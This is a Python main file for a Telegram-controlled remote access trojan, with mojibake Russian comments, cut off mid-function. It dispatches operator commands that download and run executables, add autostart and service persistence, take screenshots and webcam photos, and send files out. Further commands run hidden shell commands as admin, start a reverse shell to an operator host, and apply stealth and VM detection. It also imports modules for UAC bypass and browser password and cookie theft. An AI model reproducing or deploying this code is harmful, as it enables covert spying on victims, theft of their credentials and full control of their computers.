import os
import sys
sys.path.append(os.path.join(os.path.dirname(__file__), 'modules'))

import time
import threading
import logging
import subprocess
from datetime import datetime
import platform
import requests

# –ò–º–ø–æ—Ä—Ç –º–æ–¥—É–ª–µ–π
from config import MARKER_FILE, CHECK_INTERVAL, BOT_TOKEN, CHAT_ID, SERVICE_NAME
from logger import *
from utils import (
    is_command_for_this_instance,
    clean_command,
    get_or_create_instance_id,
    get_or_create_instance_name,
    check_internet_connection,
    verify_update_success
)
from device_manager import (
    get_devices_list,
    save_devices_list,
    add_device_to_list,
    update_device_status,
    cleanup_offline_devices,
    format_devices_list
) 
from system_info import get_system_info, format_system_info
from telegram_api import send_text_to_telegram, clear_pending_updates, send_photo_to_telegram
from persistence import (
    download_and_run_exe,
    self_update,
    add_to_autostart,
    create_persistent_copy,
    create_windows_service,
    remove_all_traces,
    update_autostart_paths
)
from advanced_commands import (
    take_screenshot,
    capture_webcam,
    get_processes_list,
    kill_process,
    browse_files,
    download_file_from_device,
    execute_command_hidden
)
from stealth import apply_stealth_measures
from reverse_shell import init_global_shell, get_global_shell, stop_global_shell
from windows_bypass import create_windows_bypass, bypass_uac_command, apply_windows_bypasses
from browser_data import extract_all_browser_data, extract_browser_passwords, extract_browser_cookies, extract_browser_history

# Watchdog —Ñ—É–Ω–∫—Ü–∏–∏
def create_marker_file():
    """–°–æ–∑–¥–∞–µ—Ç –º–∞—Ä–∫–µ—Ä–Ω—ã–π —Ñ–∞–π–ª –¥–ª—è watchdog."""
    try:
        with open(MARKER_FILE, "w") as f:
            f.write(str(time.time()))
        logging.info(f"–ú–∞—Ä–∫–µ—Ä–Ω—ã–π —Ñ–∞–π–ª —Å–æ–∑–¥–∞–Ω: {MARKER_FILE}")
    except Exception as e:
        logging.error(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ —Å–æ–∑–¥–∞–Ω–∏–∏ –º–∞—Ä–∫–µ—Ä–Ω–æ–≥–æ —Ñ–∞–π–ª–∞: {e}")

def update_marker_file():
    """–û–±–Ω–æ–≤–ª—è–µ—Ç –≤—Ä–µ–º—è –≤ –º–∞—Ä–∫–µ—Ä–Ω–æ–º —Ñ–∞–π–ª–µ."""
    try:
        with open(MARKER_FILE, "w") as f:
            f.write(str(time.time()))
    except Exception as e:
        logging.error(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ–±–Ω–æ–≤–ª–µ–Ω–∏–∏ –º–∞—Ä–∫–µ—Ä–Ω–æ–≥–æ —Ñ–∞–π–ª–∞: {e}")

def watchdog():
    """–ü—Ä–æ–≤–µ—Ä—è–µ—Ç –∞–∫—Ç–∏–≤–Ω–æ—Å—Ç—å –æ—Å–Ω–æ–≤–Ω–æ–≥–æ –ø–æ—Ç–æ–∫–∞ –∏ –ø–µ—Ä–µ–∑–∞–ø—É—Å–∫–∞–µ—Ç —Å–∫—Ä–∏–ø—Ç –ø—Ä–∏ –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ—Å—Ç–∏."""
    logging.info("Watchdog –∑–∞–ø—É—â–µ–Ω.")
    while True:
        time.sleep(CHECK_INTERVAL)
        try:
            if not os.path.exists(MARKER_FILE):
                logging.warning("–ú–∞—Ä–∫–µ—Ä–Ω—ã–π —Ñ–∞–π–ª –Ω–µ –Ω–∞–π–¥–µ–Ω. –ü–µ—Ä–µ–∑–∞–ø—É—Å–∫ —Å–∫—Ä–∏–ø—Ç–∞.")
                restart_script()
                continue
            
            with open(MARKER_FILE, "r") as f:
                last_update_time = float(f.read())
            
            if (time.time() - last_update_time) > (CHECK_INTERVAL * 2):  # –ï—Å–ª–∏ –Ω–µ –æ–±–Ω–æ–≤–ª—è–ª—Å—è 2 –∏–Ω—Ç–µ—Ä–≤–∞–ª–∞
                logging.warning("–ú–∞—Ä–∫–µ—Ä–Ω—ã–π —Ñ–∞–π–ª –Ω–µ –æ–±–Ω–æ–≤–ª—è–ª—Å—è. –ü–µ—Ä–µ–∑–∞–ø—É—Å–∫ —Å–∫—Ä–∏–ø—Ç–∞.")
                restart_script()
        except Exception as e:
            logging.error(f"–û—à–∏–±–∫–∞ –≤ watchdog: {e}")
            restart_script()

def restart_script():
    """–ü–µ—Ä–µ–∑–∞–ø—É—Å–∫–∞–µ—Ç —Ç–µ–∫—É—â–∏–π —Å–∫—Ä–∏–ø—Ç."""
    logging.info("–ü–µ—Ä–µ–∑–∞–ø—É—Å–∫ —Å–∫—Ä–∏–ø—Ç–∞...")
    try:
        current_script = os.path.abspath(sys.argv[0])
        subprocess.Popen([sys.executable, current_script],
                         creationflags=subprocess.CREATE_NEW_PROCESS_GROUP | subprocess.DETACHED_PROCESS)
        os._exit(0)
    except Exception as e:
        logging.error(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –ø–µ—Ä–µ–∑–∞–ø—É—Å–∫–µ —Å–∫—Ä–∏–ø—Ç–∞: {e}")

# –û—Å–Ω–æ–≤–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è –¥–ª—è –ø—Ä–æ—Å–ª—É—à–∏–≤–∞–Ω–∏—è –∫–æ–º–∞–Ω–¥ –∏–∑ Telegram
def main_listener() -> None:
    """–û—Å–Ω–æ–≤–Ω–æ–π —Ü–∏–∫–ª –ø—Ä–æ—Å–ª—É—à–∏–≤–∞–Ω–∏—è –∏ –æ–±—Ä–∞–±–æ—Ç–∫–∏ –∫–æ–º–∞–Ω–¥ –∏–∑ Telegram."""
    logging.info("–ó–∞–ø—É—Å–∫ –æ—Å–Ω–æ–≤–Ω–æ–≥–æ —Ü–∏–∫–ª–∞ –ø—Ä–æ—Å–ª—É—à–∏–≤–∞–Ω–∏—è –∫–æ–º–∞–Ω–¥")
    
    # –ü–æ–ª—É—á–∞–µ–º ID –∏ –∏–º—è —ç–∫–∑–µ–º–ø–ª—è—Ä–∞
    instance_id = get_or_create_instance_id()
    instance_name = get_or_create_instance_name()
    
    # –í–ê–ñ–ù–û–ï –ò–ó–ú–ï–ù–ï–ù–ò–ï: –û—á–∏—â–∞–µ–º –æ—á–µ—Ä–µ–¥—å –∏ —É—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º –Ω–∞—á–∞–ª—å–Ω—ã–π last_update_id
    last_update_id = clear_pending_updates()
    
    reconnect_delay = 60
    max_reconnect_delay = 600
    
    while True:
        try:
            if not check_internet_connection():
                logging.warning(f"–ù–µ—Ç –∏–Ω—Ç–µ—Ä–Ω–µ—Ç-—Å–æ–µ–¥–∏–Ω–µ–Ω–∏—è. –ü–æ–≤—Ç–æ—Ä–Ω–∞—è –ø–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ {reconnect_delay} —Å–µ–∫—É–Ω–¥")
                time.sleep(reconnect_delay)
                reconnect_delay = min(reconnect_delay * 1.5, max_reconnect_delay)
                continue
            
            reconnect_delay = 60
            
            # –ò—Å–ø–æ–ª—å–∑—É–µ–º last_update_id, –∫–æ—Ç–æ—Ä—ã–π –±—ã–ª —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω –ø–æ—Å–ª–µ –æ—á–∏—Å—Ç–∫–∏
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates?offset={last_update_id + 1}&timeout=30"
            response = requests.get(url, timeout=35 )
            
            if response.status_code != 200:
                logging.warning(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–ª—É—á–µ–Ω–∏–∏ –æ–±–Ω–æ–≤–ª–µ–Ω–∏–π: HTTP {response.status_code}")
                time.sleep(5)
                continue
            
            updates = response.json()
            
            if not updates.get("ok", False):
                error_desc = updates.get("description", "–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–∞—è –æ—à–∏–±–∫–∞")
                logging.warning(f"API –≤–µ—Ä–Ω—É–ª –æ—à–∏–±–∫—É: {error_desc}")
                time.sleep(5)
                continue
            
            for update in updates.get("result", []):
                try:
                    if "message" in update and "from" in update["message"] and "text" in update["message"]:
                        chat_id = update["message"]["chat"]["id"]
                        if str(chat_id) != CHAT_ID:
                            logging.warning(f"–ü–æ–ª—É—á–µ–Ω–æ —Å–æ–æ–±—â–µ–Ω–∏–µ –∏–∑ –Ω–µ–∏–∑–≤–µ—Å—Ç–Ω–æ–≥–æ —á–∞—Ç–∞: {chat_id}")
                            continue
                            
                        command = update["message"]["text"]
                        username = update["message"]["from"].get("username", "unknown")
                        user_id = update["message"]["from"].get("id", "unknown")
                        
                        logging.info(f"–ü–æ–ª—É—á–µ–Ω–∞ –∫–æ–º–∞–Ω–¥–∞: {command} –æ—Ç –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è {username} (ID: {user_id})")

                        # –ü—Ä–æ–≤–µ—Ä—è–µ–º, –ø—Ä–µ–¥–Ω–∞–∑–Ω–∞—á–µ–Ω–∞ –ª–∏ –∫–æ–º–∞–Ω–¥–∞ –¥–ª—è —ç—Ç–æ–≥–æ —ç–∫–∑–µ–º–ø–ª—è—Ä–∞
                        if not is_command_for_this_instance(command, instance_id):
                            logging.info(f"–ö–æ–º–∞–Ω–¥–∞ {command} –Ω–µ –ø—Ä–µ–¥–Ω–∞–∑–Ω–∞—á–µ–Ω–∞ –¥–ª—è —ç—Ç–æ–≥–æ —ç–∫–∑–µ–º–ø–ª—è—Ä–∞ (ID: {instance_id})")
                            continue

                        # –û–±—Ä–∞–±–æ—Ç–∫–∞ –∫–æ–º–∞–Ω–¥—ã /info
                        if command.startswith("/info"):
                            logging.info("–û–±—Ä–∞–±–æ—Ç–∫–∞ –∫–æ–º–∞–Ω–¥—ã /info")
                            info = get_system_info()
                            formatted_info = format_system_info(info)
                            send_text_to_telegram(formatted_info)
                        
                        # –û–±—Ä–∞–±–æ—Ç–∫–∞ –∫–æ–º–∞–Ω–¥—ã /download
                        elif command.startswith("/download"):
                            logging.info("–û–±—Ä–∞–±–æ—Ç–∫–∞ –∫–æ–º–∞–Ω–¥—ã /download")
                            clean_cmd = clean_command(command)
                            if clean_cmd:
                                url = clean_cmd.strip()
                                send_text_to_telegram(f"<b>üîÑ –ù–∞—á–∏–Ω–∞—é –∑–∞–≥—Ä—É–∑–∫—É —Ñ–∞–π–ª–∞ —Å URL:</b>\n{url}")
                                if download_and_run_exe(url):
                                    send_text_to_telegram("<b>‚úÖ –§–∞–π–ª —É—Å–ø–µ—à–Ω–æ –∑–∞–≥—Ä—É–∂–µ–Ω –∏ –∑–∞–ø—É—â–µ–Ω.</b>")
                                else:
                                    send_text_to_telegram("<b>‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ –∏–ª–∏ –∑–∞–ø—É—Å–∫–µ —Ñ–∞–π–ª–∞.</b>")
                            else:
                                send_text_to_telegram("<b>‚ùå URL –Ω–µ —É–∫–∞–∑–∞–Ω.</b> –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ —Ñ–æ—Ä–º–∞—Ç: <code>/download [ID] URL</code>")
                        
                        # –û–±—Ä–∞–±–æ—Ç–∫–∞ –∫–æ–º–∞–Ω–¥—ã /update
                        elif command.startswith("/update"):
                            logging.info("–û–±—Ä–∞–±–æ—Ç–∫–∞ –∫–æ–º–∞–Ω–¥—ã /update")
                            clean_cmd = clean_command(command)
                            if clean_cmd:
                                url = clean_cmd.strip()
                                
                                # –ü—Ä–æ–≤–µ—Ä—è–µ–º, —á—Ç–æ URL –≤–∞–ª–∏–¥–Ω—ã–π
                                if not url.startswith(("http://", "https://")):
                                    send_text_to_telegram("<b>‚ùå –ù–µ–≤–µ—Ä–Ω—ã–π URL. –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ http:// –∏–ª–∏ https://</b>")
                                    continue
                                
                                send_text_to_telegram("<b>üîÑ –ù–∞—á–∏–Ω–∞—é –æ–±–Ω–æ–≤–ª–µ–Ω–∏–µ...</b>")
                                
                                if self_update(url):
                                    send_text_to_telegram("<b>‚úÖ –û–±–Ω–æ–≤–ª–µ–Ω–∏–µ –∑–∞–ø—É—â–µ–Ω–æ, –ø–µ—Ä–µ–∑–∞–ø—É—Å–∫...</b>")
                                else:
                                    send_text_to_telegram("<b>‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ –æ–±–Ω–æ–≤–ª–µ–Ω–∏–∏</b>")
                            else:
                                send_text_to_telegram("<b>‚ùå URL –Ω–µ —É–∫–∞–∑–∞–Ω.</b> –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ —Ñ–æ—Ä–º–∞—Ç: <code>/update [ID] URL</code>")
                        
                        # –û–±—Ä–∞–±–æ—Ç–∫–∞ –∫–æ–º–∞–Ω–¥—ã /list
                        elif command.startswith("/list"):
                            logging.info("–û–±—Ä–∞–±–æ—Ç–∫–∞ –∫–æ–º–∞–Ω–¥—ã /list")
                            # –û—á–∏—â–∞–µ–º –Ω–µ–∞–∫—Ç–∏–≤–Ω—ã–µ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞
                            removed_count = cleanup_offline_devices()
                            if removed_count > 0:
                                logging.info(f"–£–¥–∞–ª–µ–Ω–æ {removed_count} –Ω–µ–∞–∫—Ç–∏–≤–Ω—ã—Ö —É—Å—Ç—Ä–æ–π—Å—Ç–≤")
                            
                            # –ü–æ–ª—É—á–∞–µ–º –∏ –æ—Ç–ø—Ä–∞–≤–ª—è–µ–º —Å–ø–∏—Å–æ–∫ —É—Å—Ç—Ä–æ–π—Å—Ç–≤
                            devices = get_devices_list()
                            formatted_list = format_devices_list(devices)
                            send_text_to_telegram(formatted_list)
                        
                        # –û–±—Ä–∞–±–æ—Ç–∫–∞ –∫–æ–º–∞–Ω–¥—ã /restart
                        elif command.startswith("/restart"):
                            logging.info("–û–±—Ä–∞–±–æ—Ç–∫–∞ –∫–æ–º–∞–Ω–¥—ã /restart")
                            send_text_to_telegram("<b>üîÑ –ü–µ—Ä–µ–∑–∞–ø—É—Å–∫...</b>")
                            restart_script()
                            
                        # –û–±—Ä–∞–±–æ—Ç–∫–∞ –∫–æ–º–∞–Ω–¥—ã /persist
                        elif command.startswith("/persist"):
                            logging.info("–û–±—Ä–∞–±–æ—Ç–∫–∞ –∫–æ–º–∞–Ω–¥—ã /persist")
                            send_text_to_telegram("<b>üîí –£—Å–∏–ª–µ–Ω–∏–µ –ø–µ—Ä—Å–∏—Å—Ç–µ–Ω—Ç–Ω–æ—Å—Ç–∏...</b>")
                            results = []
                            
                            # –°–æ–∑–¥–∞–µ–º –∫–æ–ø–∏–∏ –≤ —Å–∫—Ä—ã—Ç—ã—Ö –º–µ—Å—Ç–∞—Ö
                            persistent_copy = create_persistent_copy()
                            if persistent_copy:
                                results.append("‚úÖ –ö–æ–ø–∏–∏ —Å–æ–∑–¥–∞–Ω—ã")
                            else:
                                results.append("‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ —Å–æ–∑–¥–∞–Ω–∏–∏ –∫–æ–ø–∏–π")
                            
                            # –î–æ–±–∞–≤–ª—è–µ–º –≤ –∞–≤—Ç–æ–∑–∞–≥—Ä—É–∑–∫—É
                            autostart_results = add_to_autostart()
                            success_count = sum(1 for result in autostart_results.values() if result)
                            if success_count > 0:
                                results.append(f"‚úÖ –î–æ–±–∞–≤–ª–µ–Ω–æ –≤ –∞–≤—Ç–æ–∑–∞–≥—Ä—É–∑–∫—É ({success_count} –º–µ—Ç–æ–¥–æ–≤)")
                            else:
                                results.append("‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ –¥–æ–±–∞–≤–ª–µ–Ω–∏–∏ –≤ –∞–≤—Ç–æ–∑–∞–≥—Ä—É–∑–∫—É")
                            
                            # –°–æ–∑–¥–∞–µ–º —Å–ª—É–∂–±—É Windows
                            if create_windows_service():
                                results.append("‚úÖ –°–ª—É–∂–±–∞ Windows —Å–æ–∑–¥–∞–Ω–∞")
                            else:
                                results.append("‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ —Å–æ–∑–¥–∞–Ω–∏–∏ —Å–ª—É–∂–±—ã Windows")
                            
                            send_text_to_telegram("<b>–†–µ–∑—É–ª—å—Ç–∞—Ç—ã:</b>\n" + "\n".join(results))
                            
                        # –û–±—Ä–∞–±–æ—Ç–∫–∞ –∫–æ–º–∞–Ω–¥—ã /kill
                        elif command.startswith("/kill"):
                            logging.info("–û–±—Ä–∞–±–æ—Ç–∫–∞ –∫–æ–º–∞–Ω–¥—ã /kill")
                            # –ö–æ–º–∞–Ω–¥–∞ –¥–ª—è —É–¥–∞–ª–µ–Ω–∏—è –±—ç–∫–¥–æ—Ä–∞ –∏ –≤—Å–µ—Ö —Å–ª–µ–¥–æ–≤
                            send_text_to_telegram("<b>üîÑ –í—ã–ø–æ–ª–Ω—è–µ—Ç—Å—è —É–¥–∞–ª–µ–Ω–∏–µ –±—ç–∫–¥–æ—Ä–∞ –∏ –≤—Å–µ—Ö —Å–ª–µ–¥–æ–≤...</b>")
                            removal_results = remove_all_traces()
                            send_text_to_telegram("<b>–†–µ–∑—É–ª—å—Ç–∞—Ç—ã —É–¥–∞–ª–µ–Ω–∏—è:</b>\n" + "\n".join(removal_results))
                            
                            # –ó–∞–≤–µ—Ä—à–∞–µ–º –ø—Ä–æ—Ü–µ—Å—Å –ø–æ—Å–ª–µ —É–¥–∞–ª–µ–Ω–∏—è
                            os._exit(0)

                        # –û–±—Ä–∞–±–æ—Ç–∫–∞ –∫–æ–º–∞–Ω–¥—ã /screenshot
                        elif command.startswith("/screenshot"):
                            logging.info("–û–±—Ä–∞–±–æ—Ç–∫–∞ –∫–æ–º–∞–Ω–¥—ã /screenshot")
                            send_text_to_telegram("<b>üì∏ –î–µ–ª–∞—é —Å–∫—Ä–∏–Ω—à–æ—Ç —ç–∫—Ä–∞–Ω–∞...</b>")
                            screenshot_path = take_screenshot()
                            if screenshot_path:
                                send_photo_to_telegram(screenshot_path, "üì∏ –°–∫—Ä–∏–Ω—à–æ—Ç —ç–∫—Ä–∞–Ω–∞")
                                # –£–¥–∞–ª—è–µ–º –≤—Ä–µ–º–µ–Ω–Ω—ã–π —Ñ–∞–π–ª
                                try:
                                    os.remove(screenshot_path)
                                except:
                                    pass
                            else:
                                send_text_to_telegram("<b>‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ —Å–æ–∑–¥–∞–Ω–∏–∏ —Å–∫—Ä–∏–Ω—à–æ—Ç–∞</b>")

                        # –û–±—Ä–∞–±–æ—Ç–∫–∞ –∫–æ–º–∞–Ω–¥—ã /webcam
                        elif command.startswith("/webcam"):
                            logging.info("–û–±—Ä–∞–±–æ—Ç–∫–∞ –∫–æ–º–∞–Ω–¥—ã /webcam")
                            send_text_to_telegram("<b>üì∑ –î–µ–ª–∞—é —Ñ–æ—Ç–æ —Å –≤–µ–±-–∫–∞–º–µ—Ä—ã...</b>")
                            webcam_path = capture_webcam()
                            if webcam_path:
                                send_photo_to_telegram(webcam_path, "üì∑ –§–æ—Ç–æ —Å –≤–µ–±-–∫–∞–º–µ—Ä—ã")
                                # –£–¥–∞–ª—è–µ–º –≤—Ä–µ–º–µ–Ω–Ω—ã–π —Ñ–∞–π–ª
                                try:
                                    os.remove(webcam_path)
                                except:
                                    pass
                            else:
                                send_text_to_telegram("<b>‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ —Å–æ–∑–¥–∞–Ω–∏–∏ —Ñ–æ—Ç–æ —Å –≤–µ–±-–∫–∞–º–µ—Ä—ã</b>")

                        # –û–±—Ä–∞–±–æ—Ç–∫–∞ –∫–æ–º–∞–Ω–¥—ã /processes
                        elif command.startswith("/processes"):
                            logging.info("–û–±—Ä–∞–±–æ—Ç–∫–∞ –∫–æ–º–∞–Ω–¥—ã /processes")
                            send_text_to_telegram("<b>üîÑ –ü–æ–ª—É—á–∞—é —Å–ø–∏—Å–æ–∫ –ø—Ä–æ—Ü–µ—Å—Å–æ–≤...</b>")
                            processes_info = get_processes_list()
                            if processes_info:
                                send_text_to_telegram(processes_info)
                            else:
                                send_text_to_telegram("<b>‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–ª—É—á–µ–Ω–∏–∏ —Å–ø–∏—Å–∫–∞ –ø—Ä–æ—Ü–µ—Å—Å–æ–≤</b>")

                        # –û–±—Ä–∞–±–æ—Ç–∫–∞ –∫–æ–º–∞–Ω–¥—ã /kill_process
                        elif command.startswith("/kill_process"):
                            logging.info("–û–±—Ä–∞–±–æ—Ç–∫–∞ –∫–æ–º–∞–Ω–¥—ã /kill_process")
                            clean_cmd = clean_command(command)
                            if clean_cmd:
                                process_id = clean_cmd.strip()
                                send_text_to_telegram(f"<b>üîÑ –ó–∞–≤–µ—Ä—à–∞—é –ø—Ä–æ—Ü–µ—Å—Å —Å PID: {process_id}</b>")
                                if kill_process(process_id):
                                    send_text_to_telegram(f"<b>‚úÖ –ü—Ä–æ—Ü–µ—Å—Å {process_id} —É—Å–ø–µ—à–Ω–æ –∑–∞–≤–µ—Ä—à–µ–Ω</b>")
                                else:
                                    send_text_to_telegram(f"<b>‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ –∑–∞–≤–µ—Ä—à–µ–Ω–∏–∏ –ø—Ä–æ—Ü–µ—Å—Å–∞ {process_id}</b>")
                            else:
                                send_text_to_telegram("<b>‚ùå PID –ø—Ä–æ—Ü–µ—Å—Å–∞ –Ω–µ —É–∫–∞–∑–∞–Ω.</b> –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ —Ñ–æ—Ä–º–∞—Ç: <code>/kill_process [ID] PID</code>")

                        # –û–±—Ä–∞–±–æ—Ç–∫–∞ –∫–æ–º–∞–Ω–¥—ã /browse
                        elif command.startswith("/browse"):
                            logging.info("–û–±—Ä–∞–±–æ—Ç–∫–∞ –∫–æ–º–∞–Ω–¥—ã /browse")
                            clean_cmd = clean_command(command)
                            path = clean_cmd.strip() if clean_cmd else "C:\\"
                            send_text_to_telegram(f"<b>üìÅ –ü—Ä–æ—Å–º–∞—Ç—Ä–∏–≤–∞—é –ø–∞–ø–∫—É: {path}</b>")
                            browse_result = browse_files(path)
                            if browse_result:
                                send_text_to_telegram(browse_result)
                            else:
                                send_text_to_telegram(f"<b>‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ –ø—Ä–æ—Å–º–æ—Ç—Ä–µ –ø–∞–ø–∫–∏: {path}</b>")

                        # –û–±—Ä–∞–±–æ—Ç–∫–∞ –∫–æ–º–∞–Ω–¥—ã /download_file
                        elif command.startswith("/download_file"):
                            logging.info("–û–±—Ä–∞–±–æ—Ç–∫–∞ –∫–æ–º–∞–Ω–¥—ã /download_file")
                            clean_cmd = clean_command(command)
                            if clean_cmd:
                                file_path = clean_cmd.strip()
                                send_text_to_telegram(f"<b>üì• –ó–∞–≥—Ä—É–∂–∞—é —Ñ–∞–π–ª: {file_path}</b>")
                                if download_file_from_device(file_path):
                                    send_text_to_telegram(f"<b>‚úÖ –§–∞–π–ª {file_path} —É—Å–ø–µ—à–Ω–æ –∑–∞–≥—Ä—É–∂–µ–Ω</b>")
                                else:
                                    send_text_to_telegram(f"<b>‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ —Ñ–∞–π–ª–∞ {file_path}</b>")
                            else:
                                send_text_to_telegram("<b>‚ùå –ü—É—Ç—å –∫ —Ñ–∞–π–ª—É –Ω–µ —É–∫–∞–∑–∞–Ω.</b> –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ —Ñ–æ—Ä–º–∞—Ç: <code>/download_file [ID] –ø—É—Ç—å_–∫_—Ñ–∞–π–ª—É</code>")

                        # –û–±—Ä–∞–±–æ—Ç–∫–∞ –∫–æ–º–∞–Ω–¥—ã /stealth
                        elif command.startswith("/stealth"):
                            logging.info("–û–±—Ä–∞–±–æ—Ç–∫–∞ –∫–æ–º–∞–Ω–¥—ã /stealth")
                            send_text_to_telegram("<b>üïµÔ∏è –ü—Ä–∏–º–µ–Ω–µ–Ω–∏–µ –º–µ—Ä —Å–∫—Ä—ã—Ç–Ω–æ—Å—Ç–∏...</b>")
                            stealth_results = apply_stealth_measures()
                            
                            if stealth_results.get("overall", False):
                                status = "‚úÖ –£—Å–ø–µ—à–Ω–æ"
                            else:
                                status = "‚ùå –ß–∞—Å—Ç–∏—á–Ω–æ"
                            
                            message = f"<b>üïµÔ∏è –†–ï–ó–£–õ–¨–¢–ê–¢–´ –°–ö–†–´–¢–ù–û–°–¢–ò</b>\n\n"
                            message += f"<b>–°—Ç–∞—Ç—É—Å:</b> {status}\n\n"
                            
                            if stealth_results.get("disguise"):
                                message += "‚úÖ <b>–ú–∞—Å–∫–∏—Ä–æ–≤–∫–∞:</b> –ü—Ä–æ—Ü–µ—Å—Å –∑–∞–º–∞—Å–∫–∏—Ä–æ–≤–∞–Ω\n"
                            else:
                                message += "‚ùå <b>–ú–∞—Å–∫–∏—Ä–æ–≤–∫–∞:</b> –ù–µ —É–¥–∞–ª–æ—Å—å\n"
                            
                            vm_detection = stealth_results.get("vm_detection", {})
                            if vm_detection.get("overall"):
                                message += "‚ö†Ô∏è <b>VM:</b> –û–±–Ω–∞—Ä—É–∂–µ–Ω–∞ –≤–∏—Ä—Ç—É–∞–ª—å–Ω–∞—è —Å—Ä–µ–¥–∞\n"
                            else:
                                message += "‚úÖ <b>VM:</b> –í–∏—Ä—Ç—É–∞–ª—å–Ω–∞—è —Å—Ä–µ–¥–∞ –Ω–µ –æ–±–Ω–∞—Ä—É–∂–µ–Ω–∞\n"
                            
                            send_text_to_telegram(message)

                        # –û–±—Ä–∞–±–æ—Ç–∫–∞ –∫–æ–º–∞–Ω–¥—ã /cmd
                        elif command.startswith("/cmd"):
                            logging.info("–û–±—Ä–∞–±–æ—Ç–∫–∞ –∫–æ–º–∞–Ω–¥—ã /cmd")
                            clean_cmd = clean_command(command)
                            if clean_cmd:
                                cmd_text = clean_cmd.strip()
                                send_text_to_telegram(f"<b>üíª –í—ã–ø–æ–ª–Ω—è—é –∫–æ–º–∞–Ω–¥—É (–æ–±—ã—á–Ω—ã–π –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å):</b>\n<code>{cmd_text}</code>")
                                result = execute_command_hidden(cmd_text, admin=False)
                                if result:
                                    send_text_to_telegram(f"<b>‚úÖ –†–µ–∑—É–ª—å—Ç–∞—Ç –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è:</b>\n<code>{result}</code>")
                                else:
                                    send_text_to_telegram("<b>‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–∏ –∫–æ–º–∞–Ω–¥—ã</b>")
                            else:
                                send_text_to_telegram("<b>‚ùå –ö–æ–º–∞–Ω–¥–∞ –Ω–µ —É–∫–∞–∑–∞–Ω–∞.</b> –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ —Ñ–æ—Ä–º–∞—Ç: <code>/cmd [ID] –∫–æ–º–∞–Ω–¥–∞</code>")

                        # –û–±—Ä–∞–±–æ—Ç–∫–∞ –∫–æ–º–∞–Ω–¥—ã /admin_cmd
                        elif command.startswith("/admin_cmd"):
                            logging.info("–û–±—Ä–∞–±–æ—Ç–∫–∞ –∫–æ–º–∞–Ω–¥—ã /admin_cmd")
                            clean_cmd = clean_command(command)
                            if clean_cmd:
                                cmd_text = clean_cmd.strip()
                                send_text_to_telegram(f"<b>üîê –í—ã–ø–æ–ª–Ω—è—é –∫–æ–º–∞–Ω–¥—É (–∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä):</b>\n<code>{cmd_text}</code>")
                                result = execute_command_hidden(cmd_text, admin=True)
                                if result:
                                    send_text_to_telegram(f"<b>‚úÖ –†–µ–∑—É–ª—å—Ç–∞—Ç –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è:</b>\n<code>{result}</code>")
                                else:
                                    send_text_to_telegram("<b>‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–∏ –∫–æ–º–∞–Ω–¥—ã</b>")
                            else:
                                send_text_to_telegram("<b>‚ùå –ö–æ–º–∞–Ω–¥–∞ –Ω–µ —É–∫–∞–∑–∞–Ω–∞.</b> –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ —Ñ–æ—Ä–º–∞—Ç: <code>/admin_cmd [ID] –∫–æ–º–∞–Ω–¥–∞</code>")

                        # –û–±—Ä–∞–±–æ—Ç–∫–∞ –∫–æ–º–∞–Ω–¥—ã /reverse_shell_start
                        elif command.startswith("/reverse_shell_start"):
                            logging.info("–û–±—Ä–∞–±–æ—Ç–∫–∞ –∫–æ–º–∞–Ω–¥—ã /reverse_shell_start")
                            clean_cmd = clean_command(command)
                            if clean_cmd:
                                # –ü–∞—Ä—Å–∏–º –ø–∞—Ä–∞–º–µ—Ç—Ä—ã: host:port
                                params = clean_cmd.strip().split(':')
                                if len(params) == 2:
                                    host = params[0]
                                    try:
                                        port = int(params[1])
                                        send_text_to_telegram(f"<b>üîó –ó–∞–ø—É—Å–∫ Reverse Shell –Ω–∞ {host}:{port}...</b>")
                                        shell = init_global_shell(host, port)
                                        if shell:
                                            send_text_to_telegram(f"<b>‚úÖ Reverse Shell –∑–∞–ø—É—â–µ–Ω –Ω–∞ {host}:{port}</b>")
                                        else:
                                            send_text_to_telegram("<b>‚ùå –û—à–∏–±–∫–∞ –∑–∞–ø—É—Å–∫–∞ Reverse Shell</b>")
                                    except ValueError:
                                        send_text_to_telegram("<b>‚ùå –ù–µ–≤–µ—Ä–Ω—ã–π –ø–æ—Ä—Ç.</b> –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ —Ñ–æ—Ä–º–∞—Ç: <code>/reverse_shell_start [ID] host:port</code>")
                                else:
